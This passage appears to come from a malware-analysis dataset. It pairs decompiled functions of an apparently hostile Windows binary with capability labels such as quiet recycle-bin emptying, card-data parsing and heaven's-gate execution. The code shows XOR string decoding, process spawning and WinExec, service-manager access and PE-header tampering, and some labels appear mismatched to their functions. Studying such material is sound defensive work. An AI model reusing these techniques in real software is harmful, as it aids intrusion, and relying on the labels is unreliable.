0x80000 |\n                                        (in_AC & 1) * 0x40000);\n                bVar8 = false;\n                puVar5 = unaff_EBX + 0x458b1055;\n                puVar3 = uVar9;\n                iVar6 = uVar9 >> 0x20;\n                unaff_EDI = unaff_EDI + 1;\n            }\n            uVar2 = puVar3[iVar6];\n            if ((bVar8) || (!bVar8)) {\n                iVar6 = var_ch % arg_ch;\ncode_r0x00404173:\n                var_2h = *(iVar6 + arg_8h);\n            }\n            else {\n                *unaff_EBX = *unaff_EBX & 0xc3;\n                if (*(unaff_EBX + -0x8660bbb) < (puVar5 & 0xffffff00 | uVar2)) goto code_r0x00404173;\n                *(puVar3 + -0x1bf31d96) = *(puVar3 + -0x1bf31d96) << 1;\n            }\n            var_10h._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + var_ch) = var_10h ^ uVar2 ^ *((var_ch + -1) % arg_ch + arg_8h);\n            unaff_EBX = unaff_EBX & 0xffffff00 | var_2h;\n            *(var_ch + arg_18h) = var_10h ^ var_2h;\n            puVar4 = var_8h + 1;\n            var_ch = var_ch + 2;\n            bVar7 = puVar4 < arg_14h;\n            puVar3 = puVar4 + -arg_14h;\n            puVar5 = arg_14h;\n            var_8h = puVar4;\n        } while (puVar4 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 1066
    },
    "00403300": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403547) overlaps instruction at (ram,0x00403544)\n// \n// WARNING: Type propagation algorithm not settling\n\nvoid __fastcall fcn.00403300(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    uint8_t extraout_AH;\n    uint32_t *puVar5;\n    char extraout_CL;\n    int32_t extraout_ECX;\n    int32_t iVar6;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    char extraout_DL;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    uchar uVar7;\n    uint8_t in_AF;\n    char cVar8;\n    bool in_SF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar9;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t arg_14h;\n    uint uVar10;\n    uint uVar11;\n    uint *puVar12;\n    uint uVar13;\n    uint in_stack_ffffffec;\n    uint in_stack_fffffff0;\n    \n    if ((in_SF) || (!in_SF)) {\n        in_stack_fffffff0 = 0x20;\n        in_stack_ffffffec = 0x41170c;\n    }\n    pcVar1 = param_2 + 10;\n    cVar8 = param_1 + 1 >> 8;\n    bVar9 = SCARRY1(*pcVar1, cVar8);\n    *pcVar1 = *pcVar1 + cVar8;\n    puVar12 = 0x41e814;\n    fcn.00404910(0x41e814, in_stack_ffffffec, in_stack_fffffff0, unaff_EDI);\n    if ((!bVar9) && (bVar9)) {\n        *puVar12 = param_3;\n        return;\n    }\n    fcn.00404910(0x41e814, 10, 0x41172c, 0x26);\n    bVar9 = SBORROW4(unaff_ESI & 0xffff0000 | unaff_ESI + 1, 0x222c);\n    fcn.00404910(0x41e814, 10, 0x411754, 8);\n    if ((!bVar9) && (bVar9)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar10 = 0x41175c;\n    fcn.00404910(0x41e814, 10, 0x41175c, 0x19);\n    fcn.00404910(0x41e814, 10, 0x411778, 0xb);\n    fcn.00404910(0x41e814, 10, 0x411784, 0x12);\n    uVar13 = 0x41e814;\n    fcn.00404910(0x41e814, 10, 0x411798, 0x12);\n    uVar7 = extraout_DL + 0x15U < extraout_AH;\n    cVar8 = extraout_DL + 0x15U == extraout_AH;\n    while( true ) {\n        uVar11 = 0x40343f;\n        fcn.00404910(0x41e814, 10, 0x4117ac, 0x41e814);\n        if ((uVar7) || (!uVar7)) break;\n        iVar6 = extraout_ECX + -1;\n        if (iVar6 == 0 || cVar8 == '\\0') {\ncode_r0x0040344b:\n            iVar2 = *unaff_ESI;\n            *unaff_EDI = unaff_ESI + 1;\n            *(*0x9750e2b5 + -0x50) = *(*0x9750e2b5 + -0x50) | iVar6 >> 8;\n            pcVar1 = (iVar2 >> 0x1f) + 10;\n            *pcVar1 = *pcVar1 + (iVar6 + 1 >> 8);\n            fcn.00404910(0x41e814, uVar10, uVar11, uVar13);\n            bVar9 = false;\n            uVar13 = 0x41e814;\n            uVar10 = 0x4034a6;\n            fcn.00404910(0x41e814, 10, 0x4117b8, 8);\n            if ((bVar9) || (!bVar9)) {\n                uVar10 = 6;\n                uVar11 = 0x4117c0;\n            }\n            *(extraout_EDX + 10) = *(extraout_EDX + 10) + (extraout_ECX_00 + 1 >> 8);\n            uVar4 = fcn.00404910(0x41e814, uVar11, uVar10, uVar13);\n            cVar8 = uVar4 - *unaff_EDI;\n            arg_14h = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                      (in_TF & 1) * 0x100 | (cVar8 < '\\0') * 0x80 | (cVar8 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                      ((POPCOUNT(cVar8) & 1U) == 0) * 4 | uVar4 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                      (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n            func_0x10189451();\n            fcn.00404910(0x41e814, 10, 0x4117c8, arg_14h);\n            bVar9 = false;\n            uVar11 = 0x41e814;\n            uVar13 = 0x40351e;\n            fcn.00404910(0x41e814, 10, 0x4117d0, 7);\n            if ((bVar9) || (!bVar9)) {\n                uVar13 = 6;\n                uVar10 = 0x4117d8;\n            }\n            *(extraout_EDX_00 + 10) = *(extraout_EDX_00 + 10) + (extraout_ECX_01 + 1 >> 8);\n            fcn.00404910(0x41e814, uVar10, uVar13, uVar11);\n            bVar9 = false;\n            puVar5 = fcn.00404910(0x41e814, 10, 0x4117e0, 0x25);\n            if ((!bVar9) && (bVar9)) {\n                if (&stack0xfffffff4 < *puVar5 || puVar5 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                *0x6ab8ebc4 = *0x6ab8ebc4 + extraout_CL;\n                pcVar3 = swi(1);\n                (*pcVar3)();\n                return;\n            }\n            fcn.00404910(0x41e814, 10, 0x411808, 8);\n            return;\n        }\n    }\n    uVar11 = 8;\n    uVar10 = 0x4117b0;\n    iVar6 = extraout_ECX;\n    goto code_r0x0040344b;\n}\n",
        "token_count": 1847
    },
    "00402160": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402160(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    fcn.00403300();\n    iVar2 = fcn.00401950();\n    if (iVar2 != 0) {\n        lpszPath = 0;\n        puVar3 = &var_25fh;\n        for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = 0;\n        *(puVar3 + 2) = 0;\n        iVar2 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, *0x10 + -0x264, 0x26, 0);\n        if (iVar2 != 0) {\n            fcn.004011b0();\n            s = 0;\n            puVar3 = &var_15bh;\n            for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x41172c, &lpszPath, 0x41170c, 3);\n            var_14h = 0;\n            do {\n                puVar3 = &var_58h;\n                for (iVar2 = 0x11; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n                hProcess = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                lParam = 0;\n                var_28h._0_2_ = 0;\n                var_4h = 0;\n                iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &s, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar2 == 0) {\n                    return;\n                }\n                (*_sym.imp.KERNEL32.dll_Sleep)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.00402060, lParam);\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar2 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar1)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 789
    },
    "00403ea0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f40) overlaps instruction at (ram,0x00403f3e)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403ea0(int16_t *arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uchar uStack28;\n    uchar uStack27;\n    ushort uStack26;\n    uchar uStack24;\n    uchar uStack23;\n    ushort uStack22;\n    uint32_t var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return 0;\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] != 0) {\n        return 0;\n    }\n    var_4h = 0x40;\n    *0x91 = *0x91 - &uStack24;\n    if (0x80 < *(arg_8h + 0x1e)) {\n        if (*(arg_8h + 0x1e) < 0xc0) {\n            var_4h = *(arg_8h + 0x1e) - 0x80;\n        }\n        uStack24 = var_4h;\n        uStack23 = var_4h >> 8;\n        uStack22 = var_4h >> 0x10;\n        puVar1 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        if (puVar1 != NULL) {\n            uStack28 = SUB41(puVar1, 0);\n            uStack27 = puVar1 >> 8;\n            uStack26 = puVar1 >> 0x10;\n            uVar3 = 0;\n            if (var_4h != 0) {\n                do {\n                    uStack24 = 0x15;\n                    uStack23 = 0x40;\n                    uStack22 = 0x40;\n                    iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n                    uVar4 = uVar3 + 1;\n                    *(uVar3 + puVar1) = iVar2 % 0xff;\n                    uVar3 = uVar4;\n                } while (uVar4 < var_4h);\n            }\n            puVar5 = arg_8h + 0x40;\n            for (uVar3 = var_4h >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar5 = *puVar1;\n                puVar1 = puVar1 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n                *puVar5 = *puVar1;\n                puVar1 = puVar1 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            uStack24 = uStack28;\n            uStack23 = uStack27;\n            uStack22 = uStack26;\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 794
    },
    "00404750": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404750(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    fcn.00402940(arg_8h_00, arg_8h);\n    uVar1 = fcn.00405000(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 158
    },
    "00404910": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404910(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < arg_14h) {\n        do {\n            *(iVar1 + arg_10h) = arg_14h ^ *(iVar1 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00404540": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404540(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x41e84c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00404370(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411664, acStack1304, &uStack2112);\n    uStack2088 = 0x4116ec;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x411704;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.004017d0(auStack1564, 0x411660, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1865
    },
    "004039e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004039e0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004023b0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411810;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00403bc0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403bca) overlaps instruction at (ram,0x00403bc9)\n// \n// WARNING: Removing unreachable block (ram,0x00403c64)\n\nulong __fastcall fcn.00403bc0(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    uchar *puVar2;\n    char **ppcVar3;\n    char cVar4;\n    uint in_EAX;\n    char *pcVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint unaff_EBX;\n    uint *puVar8;\n    uint *puVar9;\n    uint unaff_ESI;\n    ushort in_SS;\n    bool bVar10;\n    bool bVar11;\n    uint8_t auStack127 [97];\n    ushort uStack30;\n    ushort uStack28;\n    ushort uStack26;\n    ushort uStack24;\n    ushort uStack22;\n    ushort uStack20;\n    uint16_t uStack18;\n    \n    puVar9 = &stack0xfffffffc;\n    uStack18 = param_2;\n    uStack22 = in_EAX;\n    uStack20 = in_EAX >> 0x10;\n    do {\n        uVar7 = param_2;\n        pcVar5 = CONCAT22(uStack20, uStack22);\n        param_2 = param_2 & 0xffff0000 | uStack18;\n        puVar2 = puVar9[2];\n        *puVar2 = 0xed;\n        if (0x51 < uVar7) {\n            uStack20 = unaff_ESI;\n            uStack18 = unaff_ESI >> 0x10;\n            if (uVar7 < 0x52) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n        }\n        while( true ) {\n            puVar2[1] = 0x1b;\n            puVar2[2] = 0x50;\n            uStack26 = SUB42(pcVar5, 0);\n            uStack24 = pcVar5 >> 0x10;\n            uVar7 = param_1 - 5U & 0x44;\n            bVar11 = uVar7 == 0;\n            bVar10 = (POPCOUNT(uVar7) & 1U) == 0;\n            puVar2[3] = 0xa3;\n            if ((!bVar11) && (bVar11)) break;\n            puVar2[4] = 0x47;\n            puVar2[5] = 0x36;\n            if ((bVar10) || (!bVar10)) {\ncode_r0x00403c9d:\n                puVar2[6] = 0xc5;\n                if ((!bVar11) && (bVar11)) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                puVar2[7] = 0x37;\n                uStack30 = unaff_EBX;\n                uStack28 = unaff_EBX >> 0x10;\n                bVar10 = (POPCOUNT((unaff_EBX >> 8 ^ 0x16 | pcVar5 >> 8) - (param_2 >> 8)) & 1U) != 0;\n                puVar2[8] = 0xf6;\n                if ((bVar10) && (!bVar10)) {\n                    puVar8 = &uStack26;\n                    uStack26 = SUB42(puVar9, 0);\n                    uStack24 = puVar9 >> 0x10;\n                    cVar4 = '\\x1e';\n                    do {\n                        puVar9 = puVar9 + -1;\n                        puVar8 = puVar8 + -1;\n                        *puVar8 = *puVar9;\n                        cVar4 = cVar4 + -1;\n                    } while ('\\0' < cVar4);\n                    uVar6 = in(0x78);\n                    return CONCAT44(param_2, uVar6);\n                }\n                puVar2[9] = 0x28;\n                puVar2[10] = 0x33;\n                puVar2[0xb] = 0x5a;\n                puVar2[0xc] = 0x80;\n                uStack26 = uStack30;\n                uStack24 = uStack28;\n                puVar9 = puVar9[3];\n                *puVar9 = 0xd;\n                return CONCAT44(param_2, puVar9);\n            }\n            ppcVar3 = segment(in_SS, *0x10 + -0x16);\n            pcVar5 = *ppcVar3;\n            param_2 = 0xb7bc9ea5;\n            if (!bVar10) {\n                bVar11 = *0x10 == 0x12;\n                pcVar5 = pcVar5;\n                uStack22 = 0x9ea5;\n                uStack20 = 0xb7bc;\n                goto code_r0x00403c9d;\n            }\n            puVar9 = puVar9 + 1;\n            *pcVar5 = *pcVar5 + pcVar5;\n        }\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        puVar1 = puVar9 + -0x7b;\n        *puVar1 = *puVar1 << 6 | *puVar1 >> 2;\n    } while( true );\n}\n",
        "token_count": 1229
    },
    "00404220": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404309) overlaps instruction at (ram,0x00404307)\n// \n// WARNING: Removing unreachable block (ram,0x00404309)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404220(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    uchar var_24h;\n    uint var_23h;\n    uint *var_4h;\n    \n    if ((!SBORROW4(&stack0xfffffffc, 0x24)) && (SBORROW4(&stack0xfffffffc, 0x24))) {\n        LOCK();\n    }\n    bVar8 = unaff_EBX >> 8 != '\\0';\n    if ((bVar8) && (!bVar8)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    var_4h = fcn.00404080(arg_18h, arg_1ch, 0x4113d4, 7);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    if (var_4h != NULL) {\n        var_24h = 0;\n        puVar6 = &var_23h;\n        for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        uVar4 = 0;\n        do {\n            uVar2 = (*pcVar1)();\n            (&var_24h)[uVar4] = uVar2;\n            uVar5 = uVar4 + 1;\n            iVar3 = uVar4 - 0x1f;\n            uVar4 = uVar5;\n        } while (uVar5 < 0x20);\n        if ((0x1f < uVar5) && (SBORROW4(uVar5, 0x20) != iVar3 < 0)) {\n            *(puVar6 + 3U | &stack0xfffffffc) = uVar2;\n        }\n        puVar6 = &var_24h;\n        puVar7 = var_4h;\n        for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        fcn.00403800(arg_8h, arg_ch, arg_10h, arg_14h, &var_24h, 0x20, var_4h);\n        fcn.004035c0(arg_18h, arg_1ch);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 729
    },
    "004047c0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004048e0) overlaps instruction at (ram,0x004048df)\n// \n\nvoid __cdecl fcn.004047c0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t unaff_EBX;\n    uchar *puVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_4h;\n    \n    puVar7 = &stack0xfffffffc;\n    uVar3 = fcn.00401000(0, arg_8h, arg_ch + 1U >> 1);\n    uVar3 = uVar3 & 0xffff;\n    uVar9 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    piVar6 = uVar9 >> 0x20;\n    uVar1 = *(uVar9 + 0x58);\n    if (uVar3 < uVar1) {\n        uVar3 = (uVar3 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        uVar3 = uVar3 - (uVar1 & 0xffff);\n    }\n    piVar4 = uVar1 >> 0x10;\n    uVar2 = uVar1 >> 0x10;\n    bVar8 = (POPCOUNT(uVar3 - uVar2 & 0xff) & 1U) == 0;\n    if (uVar3 < uVar2) {\n        if (bVar8) {\ncode_r0x004048cb:\n            uVar3 = uVar3 - piVar4;\n        }\n        else {\n            uVar3 = uVar3 & 0xffff;\n            if (!bVar8) goto code_r0x004048cb;\n            puVar7 = *0x2b17b43a;\n            piVar6 = piVar4;\n        }\n        uVar3 = (uVar3 & 0xffff) - 1;\n    }\n    else {\n        uVar3 = uVar3 - piVar4;\n        puVar7 = &stack0xfffffffc;\n    }\n    bVar8 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n    if (bVar8) {\n        iVar5 = extraout_ECX;\n        if (!bVar8) goto code_r0x004048df;\n    }\n    iVar5 = *(puVar7 + 0xc);\n    piVar6 = *(puVar7 + 0x14);\ncode_r0x004048df:\n    *(unaff_EBX + 0x558b0c4d) = *(unaff_EBX + 0x558b0c4d) | 0x14;\n    *piVar6 = uVar3 + iVar5;\n    **(puVar7 + 0x10) = *(*(puVar7 + -4) + 0x58);\n    return;\n}\n",
        "token_count": 713
    },
    "004010d0": {
        "rules": [
            "get user security identifier"
        ],
